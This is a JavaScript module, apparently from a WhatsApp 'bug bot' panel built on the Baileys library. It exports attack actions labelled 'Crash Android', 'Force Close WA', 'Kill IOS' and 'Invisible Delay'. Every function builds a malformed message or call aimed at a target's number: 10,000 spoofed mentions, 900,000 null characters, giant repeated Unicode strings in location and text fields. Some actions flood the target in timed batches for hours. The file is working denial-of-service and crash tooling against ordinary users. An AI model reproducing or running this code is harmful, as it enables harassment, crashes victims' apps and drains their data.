const crypto = require("crypto");

const {
    generateWAMessageFromContent,
    generateMessageID,
    encodeWAMessage, 
    jidDecode, 
    encodeSignedDeviceIdentity
} = require("@whiskeysockets/baileys");
const chalk = require('chalk');

// Utility Functions
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ==================== CORE BUG FUNCTIONS ==================== //

const mediaData=[{ID:"69680D38",uri:"t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",buffer:"11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",sid:"5e03e0",SHA256:"ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",ENCSHA256:"7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",mkey:"Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI="},{ID:"69680D38",uri:"t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",buffer:"11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
sid:"5e03e0",SHA256:"I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",ENCSHA256:"HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",mkey:"Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU="},{ID:"696C0CE0",uri:"t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",buffer:"01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",sid:"5e03e0",SHA256:"n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",ENCSHA256:"RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",mkey:"dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac="}];
let sequentialIndex=0;
async function Warlock(h,d){var a=mediaData[sequentialIndex];sequentialIndex=(sequentialIndex+1)%mediaData.length;var b=a.ID;const e=a.uri,f=a.buffer,g=a.sid,k=a.SHA256,l=a.ENCSHA256;a=a.mkey;let c;c=!1;b={viewOnceMessage:{message:{stickerMessage:{url:`https://mmg.whatsapp.net/v/${e}=${f}=${b}&_nc_sid=${g}&mms3=true`,fileSha256:k,fileEncSha256:l,mediaKey:a,mimetype:"image/webp",directPath:`/v/${e}=${f}=${b}&_nc_sid=${g}`,fileLength:{low:Math.floor(1E3*Math.random()),high:0,unsigned:!0},mediaKeyTimestamp:{low:Math.floor(17E8*
Math.random()),high:0,unsigned:!1},firstFrameLength:19904,firstFrameSidecar:"KN4kQ5pyABRAgA==",isAnimated:!0,contextInfo:{participant:d,mentionedJid:["0@s.whatsapp.net",...Array.from({length:1E4},()=>"1"+Math.floor(5E6*Math.random())+"@s.whatsapp.net")],groupMentions:[],entryPointConversionSource:"non_contact",entryPointConversionApp:"whatsapp",entryPointConversionDelaySeconds:467593},stickerSentTs:{low:Math.floor(-2E7*Math.random()),high:555,unsigned:c},isAvatar:c,isAiSticker:c,isLottie:c}}}};b=
generateWAMessageFromContent(d,b,{});await h.relayMessage("status@broadcast",b.message,{messageId:b.key.id,statusJidList:[d],additionalNodes:[{tag:"meta",attrs:{},content:[{tag:"mentioned_users",attrs:{},content:[{tag:"to",attrs:{jid:d},content:void 0}]}]}]})};

async function autosync(sock, X) {
    try {
    let devices = (
        await sock.getUSyncDevices([X], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let createMutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let mutexManager = createMutex();
    let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let originalCreateParticipantNodes = sock.createParticipantNodes.bind(sock);
    let encodeMsg = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let mapped = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
            let { user: targetUser } = jidDecode(jid);
            let { user: ownPnUser } = jidDecode(meId);
            let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
            let isSelf = jid === meId || jid === meLid;

            if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

            let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));

            return mutexManager.mutex(jid, async () => {
                let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
                if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                return {
                    tag: 'to',
                    attrs: { jid },
                    content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                };
            });
        }));

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let { nodes: destinations, shouldIncludeDeviceIdentity } =
        await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let callNode = {
        tag: "call",
        attrs: { to: X, id: sock.generateMessageTag(), from: sock.user.id },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : [])
            ]
        }]
    };

    await sock.sendNode(callNode);
    await sock.sendNode(callNode);
    
         } catch (err) {
            console.error(err);
         }
         
        };
        
async function PaymentNoButton(sock, target) {
    const msg = await generateWAMessageFromContent(
        target,
        {
            interactiveMessage: {
                message: {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "IDR",
                        amount1000: 25000 * 1000,
                        requestFrom: target,
                        noteMessage: {
                            extendedTextMessage: {
                                text: "Pembayaran layanan Oleh - AiiSigma"
                            }
                        },
                        expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id
    });
}

async function InVisDelayLoc(sock, X, ptcp = true) {
   
        let msg = generateWAMessageFromContent(X, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                },
                body: {
                    text: "𖣂᳟༑ᜌ ̬     ͠⤻𝐌𝐀𝐒𝐓𝐄𝐑 ( 𖣂 ) 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ⃜    ᭨᳟᪳",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }, {});

        await sock.relayMessage(X, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, ptcp ? { messageId: msg.key.id, participant: { jid: X } } : { messageId: msg.key.id });
    }
    
    
    async function reviewIOS(sock, isTarget, mention) {
console.log(chalk.red.bold(`
╭───────────────────
│${chalk.blue("🍷 𝙷𝙸𝚃°𝙲𝙾𝚁𝙴 𝚂𝚈𝚂𝙸𝙾𝚂")}
╰───────────────────`));
const TravaIphone = "" + "𑇂𑆵𑆴𑆿".repeat(50000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         url: `https://NandoOfficiali${"𑇂𑆵𑆴𑆿".repeat(15000)}.com`, 
      }
      let msg = generateWAMessageFromContent(isTarget, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "(🍁) Nando Is Back?" + TravaIphone, 
            matchedText: "(🍁) Nando Is Back?",
            description: "𑇂𑆵𑆴𑆿".repeat(50000),
            title: "(🍁) Nando Is Back?" + "𑇂𑆵𑆴𑆿".repeat(50000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(isTarget, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(isTarget, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [isTarget],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: isTarget
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [isTarget],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: isTarget 
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [isTarget],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: isTarget 
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

// INI BUAT BUTTON DELAY 50%
async function delaylow(sock, durationHours, X) {
    if (!sock) {
        console.error('❌ Socket tidak tersedia untuk delaylow');
        return;
    }

    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0;
    let batch = 1;
    const maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            return;
        }

        try {
            if (count < 50) {
                await Promise.all([
                    InVisDelayLoc(sock, X),
                    
                    sleep(500)
                ]);

                console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
                count++;
                setTimeout(sendNext, 700);
            } else {
                console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
                if (batch < maxBatches) {
                    console.log(chalk.yellow(`( 🍷 Indictive | Core V6 ).`));
                    count = 0;
                    batch++;
                    setTimeout(sendNext, 300000);
                } else {
                    console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
                }
            }
        } catch (error) {
            console.error(`✗ Error saat mengirim: ${error.message}`);
            setTimeout(sendNext, 700);
        }
    };
    sendNext();
}

// ==================== EXPORTED ACTIONS ==================== //

// Tentukan tindakan di sini. Anda dapat mengganti nama kunci (misalnya 'crashAndroid') sesuai keinginan Anda.
// Namun, pastikan formulir HTML Anda mengirimkan 'mode' yang sesuai.

const actions = {
    crashAndroid: {
        name: "Crash Android System",
        description: "Crash target Android WA",
        icon: "fa-brands fa-android",
        execute: async (sock, target) => {
            for (let i = 0; i < 1; i++) {
                await PaymentNoButton(sock, target);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    },
    invisDelay: {
        name: "Invisible Delay",
        description: "Causes invisible delay",
        icon: "fa-solid fa-clock",
        execute: async (sock, target) => {
            await delaylow(sock, 24, target);
        }
    },
    DelayNew: {
        name: "Delay drain Kouta",
        description: "drain invisible delay",
        icon: "fa-solid fa-clock",
        execute: async (sock, target) => {
            for (let i = 0; i < 30; i++) {
                await Warlock(sock, target);
                await InVisDelayLoc(sock, target);
            }
        }
    },
    forceClose: {
        name: "Force Close WA",
        description: "Force close the app",
        icon: "fa-solid fa-skull",
        execute: async (sock, target) => {
            for (let i = 0; i < 50; i++) {
                await autosync(sock, target);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    },
    killIos: {
        name: "Kill IOS",
        description: "Crash iOS WA",
        icon: "fa-brands fa-apple",
        execute: async (sock, target) => {
            for (let i = 0; i < 20; i++) {
                await reviewIOS(sock, target, true);
            }
            console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
        }
    }
};

module.exports = {
    actions
};
